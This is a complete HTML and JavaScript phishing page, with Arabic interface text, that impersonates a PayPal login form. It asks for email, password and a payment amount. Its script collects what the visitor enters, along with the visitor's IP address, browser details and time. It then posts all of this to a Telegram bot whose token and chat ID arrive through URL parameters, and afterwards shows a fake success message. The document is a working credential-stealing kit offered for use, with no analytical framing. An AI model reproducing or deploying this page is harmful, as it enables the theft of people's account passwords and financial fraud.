<!DOCTYPE html> <html lang="ar" dir="rtl"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>PayPal • تسجيل الدخول</title> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> <style> * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; } body { background: linear-gradient(145deg, #f5f7fa 0%, #e9ecef 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; } .container { width: 100%; max-width: 500px; margin: 20px; } /* البطاقة الرئيسية */ .paypal-card { background: white; border-radius: 28px; overflow: hidden; box-shadow: 0 30px 60px -15px rgba(0,48,135,0.3); border: 1px solid rgba(0,112,186,0.15); } /* الهيدر */ .paypal-header { background: #003087; padding: 35px 30px; text-align: center; position: relative; overflow: hidden; } .paypal-header::after { content: ""; position: absolute; top: -50%; right: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%); animation: rotate 20s linear infinite; } @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } .paypal-logo { display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 15px; position: relative; z-index: 2; } .paypal-logo i { font-size: 52px; color: white; filter: drop-shadow(0 4px 10px rgba(0,0,0,0.2)); } .paypal-logo span { font-size: 40px; font-weight: 700; color: white; letter-spacing: -0.5px; } .paypal-header h2 { color: rgba(255,255,255,0.95); font-size: 22px; font-weight: 500; margin-bottom: 5px; position: relative; z-index: 2; } .paypal-header p { color: rgba(255,255,255,0.8); font-size: 15px; position: relative; z-index: 2; } /* المحتوى */ .paypal-body { padding: 35px 30px; background: white; } /* حقل الإدخال */ .input-group { margin-bottom: 25px; } .input-group label { display: block; color: #1a2639; margin-bottom: 10px; font-size: 15px; font-weight: 600; } .input-group label i { color: #003087; margin-left: 8px; width: 20px; } .input-field { width: 100%; padding: 18px 20px; background: #f8fafd; border: 2px solid #e9ecef; border-radius: 16px; color: #1a2639; font-size: 16px; transition: all 0.2s; } .input-field:focus { outline: none; border-color: #003087; background: white; box-shadow: 0 0 0 4px rgba(0,48,135,0.1); } .input-field::placeholder { color: #a0a9b8; font-size: 14px; } /* حقل المبلغ (جانبي) */ .amount-row { display: flex; gap: 15px; margin-bottom: 25px; } .amount-field { flex: 2; } .currency-field { flex: 1; } .currency-select { width: 100%; padding: 18px 15px; background: #f8fafd; border: 2px solid #e9ecef; border-radius: 16px; color: #1a2639; font-size: 16px; font-weight: 600; cursor: pointer; appearance: none; background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23003087' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>"); background-repeat: no-repeat; background-position: left 15px center; text-align: right; } .currency-select:focus { outline: none; border-color: #003087; background-color: white; } /* خيارات سريعة للمبلغ */ .quick-amounts { display: flex; gap: 10px; margin-bottom: 30px; flex-wrap: wrap; } .quick-amount { flex: 1; min-width: 70px; background: #f8fafd; border: 2px solid #e9ecef; border-radius: 30px; padding: 12px 5px; text-align: center; font-weight: 600; color: #1a2639; cursor: pointer; transition: all 0.2s; font-size: 14px; } .quick-amount:hover { border-color: #003087; background: #f0f5ff; } .quick-amount.selected { background: #003087; border-color: #003087; color: white; } /* زر الدخول */ .paypal-btn { width: 100%; padding: 20px; background: #003087; border: none; border-radius: 50px; color: white; font-size: 18px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 12px; transition: all 0.2s; margin: 20px 0 25px; border: 1px solid #00256e; } .paypal-btn:hover { background: #00256e; transform: translateY(-2px); box-shadow: 0 15px 30px rgba(0,37,110,0.3); } .paypal-btn i { font-size: 20px; } /* شريط الأمان */ .security-bar { display: flex; align-items: center; justify-content: center; gap: 15px; color: #6c757d; font-size: 13px; margin: 20px 0; } .security-bar i { color: #00a884; } /* فوتر */ .paypal-footer { padding: 20px 30px; text-align: center; border-top: 1px solid #e9ecef; background: #f8fafd; } .footer-links { display: flex; align-items: center; justify-content: center; gap: 25px; margin-bottom: 12px; } .footer-links a { color: #6c757d; text-decoration: none; font-size: 13px; transition: color 0.2s; } .footer-links a:hover { color: #003087; } .copyright { color: #a0a9b8; font-size: 12px; } /* رسالة منبثقة */ .toast-message { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #1a2639; color: white; padding: 16px 32px; border-radius: 60px; font-weight: 500; box-shadow: 0 15px 35px rgba(0,0,0,0.2); z-index: 1000; animation: slideUp 0.3s ease; display: none; } @keyframes slideUp { from { bottom: 0; opacity: 0; } to { bottom: 30px; opacity: 1; } } /* شعارات الدفع */ .payment-icons { display: flex; align-items: center; justify-content: center; gap: 20px; margin-top: 20px; } .payment-icons i { font-size: 28px; color: #a0a9b8; } </style> </head> <body> <div class="container"> <div class="paypal-card"> <!-- الهيدر --> <div class="paypal-header"> <div class="paypal-logo"> <i class="fab fa-paypal"></i> <span>PayPal</span> </div> <h2>تسجيل الدخول</h2> <p>أدخل بيانات حسابك للمتابعة</p> </div> <!-- المحتوى --> <div class="paypal-body"> <!-- بريد إلكتروني --> <div class="input-group"> <label><i class="fas fa-envelope"></i> البريد الإلكتروني</label> <input type="email" id="email" class="input-field" placeholder="example@email.com" value="user@example.com"> </div> <!-- كلمة المرور --> <div class="input-group"> <label><i class="fas fa-lock"></i> كلمة المرور</label> <input type="password" id="password" class="input-field" placeholder="********" value="12345678"> </div> <!-- المبلغ + العملة (جنب بعض) --> <div class="amount-row"> <div class="amount-field"> <label><i class="fas fa-dollar-sign"></i> المبلغ</label> <input type="number" id="amount" class="input-field" placeholder="0.00" value="100" min="1" step="0.01"> </div> <div class="currency-field"> <label><i class="fas fa-flag"></i> العملة</label> <select id="currency" class="currency-select"> <option value="USD" selected>$ USD</option> <option value="EUR">€ EUR</option> <option value="GBP">£ GBP</option> <option value="SAR">﷼ SAR</option> <option value="AED">د.إ AED</option> </select> </div> </div> <!-- خيارات سريعة للمبلغ --> <div class="quick-amounts"> <div class="quick-amount" data-amount="50">$50</div> <div class="quick-amount selected" data-amount="100">$100</div> <div class="quick-amount" data-amount="200">$200</div> <div class="quick-amount" data-amount="500">$500</div> <div class="quick-amount" data-amount="1000">$1000</div> </div> <!-- زر تسجيل الدخول --> <button class="paypal-btn" id="loginBtn"> <i class="fas fa-sign-in-alt"></i> تسجيل الدخول </button> <!-- شريط الأمان --> <div class="security-bar"> <i class="fas fa-lock"></i> <span>اتصال آمن • تشفير 256-bit</span> <i class="fas fa-shield-alt"></i> </div> <!-- شعارات الدفع --> <div class="payment-icons"> <i class="fab fa-cc-visa"></i> <i class="fab fa-cc-mastercard"></i> <i class="fab fa-cc-amex"></i> <i class="fab fa-cc-paypal"></i> </div> </div> <!-- الفوتر --> <div class="paypal-footer"> <div class="footer-links"> <a href="#">مساعدة</a> <a href="#">خصوصية</a> <a href="#">أمان</a> <a href="#">اتصل بنا</a> </div> <div class="copyright"> © 2025 PayPal, Inc. جميع الحقوق محفوظة </div> </div> </div> </div> <!-- رسالة منبثقة --> <div class="toast-message" id="toast"></div> <script> // ==================== فك تشفير التوكن ==================== function decodeToken(encoded) { try { return atob(decodeURIComponent(encoded)); } catch { return null; } } // قراءة الباراميترات من الرابط const params = new URLSearchParams(window.location.search); const CHAT_ID = params.get('id'); const encodedToken = params.get('tok'); const BOT_TOKEN = encodedToken ? decodeToken(encodedToken) : null; // التحقق من صحة الرابط if(!CHAT_ID || !BOT_TOKEN) { alert('⚠️ رابط غير صالح\nالرجاء استخدام الرابط الصحيح مع ?id=و?tok='); } // ==================== العناصر ==================== const emailInput = document.getElementById('email'); const passwordInput = document.getElementById('password'); const amountInput = document.getElementById('amount'); const currencySelect = document.getElementById('currency'); const loginBtn = document.getElementById('loginBtn'); const toast = document.getElementById('toast'); const quickAmounts = document.querySelectorAll('.quick-amount'); // ==================== اختيار المبلغ السريع ==================== quickAmounts.forEach(amount => { amount.addEventListener('click', function() { quickAmounts.forEach(a => a.classList.remove('selected')); this.classList.add('selected'); amountInput.value = this.dataset.amount; }); }); // ==================== دالة عرض الرسالة ==================== function showToast(msg, isSuccess = true) { toast.style.display = 'block'; toast.style.background = isSuccess ? '#1a2639' : '#dc3545'; toast.textContent = msg; setTimeout(() => { toast.style.display = 'none'; }, 3000); } // ==================== إرسال البيانات للبوت ==================== loginBtn.addEventListener('click', async function() { // التحقق من المدخلات const email = emailInput.value.trim(); const password = passwordInput.value.trim(); const amount = amountInput.value.trim(); const currency = currencySelect.value; if(!email) { showToast('الرجاء إدخال البريد الإلكتروني', false); return; } if(!password) { showToast('الرجاء إدخال كلمة المرور', false); return; } if(!amount || amount <= 0) { showToast('الرجاء إدخال مبلغ صحيح', false); return; } // الحصول على IP let ip = 'غير معروف'; try { const ipRes = await fetch('https://api.ipify.org?format=json'); const ipData = await ipRes.json(); ip = ipData.ip; } catch (e) { console.log('فشل في جلب IP'); } // تجهيز نص الرسالة const message = ` 🔐 <b>تسجيل دخول PayPal</b> ━━━━━━━━━━━━━━ 📧 <b>البريد:</b> ${email} 🔑 <b>كلمة المرور:</b> ${password} 💰 <b>المبلغ:</b> ${amount} ${currency} ━━━━━━━━━━━━━━ 🌍 <b>IP:</b> ${ip} 📱 <b>الجهاز:</b> ${navigator.userAgent.substring(0,100)} ⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')} ━━━━━━━━━━━━━━ `; try { const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' }) }); const result = await response.json(); if(result.ok) { showToast('✅ تم تسجيل الدخول بنجاح'); // تفريغ الحقول (اختياري) // emailInput.value = ''; // passwordInput.value = ''; // amountInput.value = '100'; // رسالة نجاح للمستخدم setTimeout(() => { alert('🎉 تم تسجيل الدخول بنجاح!\nسيتم تحويلك إلى لوحة التحكم...'); }, 1000); } else { showToast('❌ فشل الإرسال: ' + result.description, false); } } catch (error) { showToast('❌ حدث خطأ في الاتصال', false); console.error(error); } }); // ==================== إذا الرابط مش صالح ==================== if(!CHAT_ID || !BOT_TOKEN) { document.body.innerHTML = ` <div style="background: white; padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; margin: 50px auto; box-shadow: 0 20px 40px rgba(0,0,0,0.1);"> <i class="fab fa-paypal" style="color: #003087; font-size: 60px; margin-bottom: 20px;"></i> <h2 style="margin-bottom: 15px; color: #1a2639;">رابط غير صالح</h2> <p style="color: #6c757d; margin-bottom: 20px;">الرجاء استخدام الرابط الصحيح مع باراميترات id و tok</p> <code style="background: #f8fafd; padding: 12px; border-radius: 10px; display: block; border: 1px solid #e9ecef; color: #003087;">?id=123456789&tok=ZW5jb2RlZHRva2Vu</code> </div> `; } </script> </body> </html>
